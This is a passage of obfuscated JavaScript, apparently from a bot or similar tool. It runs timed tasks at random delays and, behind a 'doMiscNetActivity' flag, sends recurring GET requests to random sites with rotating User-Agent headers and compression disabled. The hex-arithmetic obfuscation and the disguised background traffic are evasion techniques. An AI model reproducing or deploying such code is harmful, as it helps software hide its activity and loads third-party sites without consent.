    setTimeout(f, (-0x7e3e * -0x1 + -0xffd9 + 0x16bfb) * k * getRandomInt(0xee * -0x4 + 0x2705 + -0x11a6 * 0x2, -0x5 * 0x182 + -0xeec + 0x1679));
  setInterval(() => {
    f();
    for (let l = 0x1b85 + 0x252 + -0x1dd7; l < -0x1f1d + 0x111e + -0x1 * -0xe03; l++)
      setTimeout(f, (0x9f54 + 0x1cb54 + 0x2006 * -0xc) * l * getRandomInt(-0xfe0 + -0x12b * -0x7 + -0x3da * -0x2, -0x1c02 + 0x544 * -0x4 + 0x3115));
  }, -0x3d680c + 0x1b1267 * 0x3 + 0x231f57);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0xee + 0xc82 + 0xfc4 * 0x1) * getRandomInt(0x1066 + -0x449 * -0x1 + -0x2 * 0xa57, 0x5b8 + -0xaf3 * -0x1 + -0x1 * 0x10a6));
}, 0x1113 + 0x17dd + -0x288c);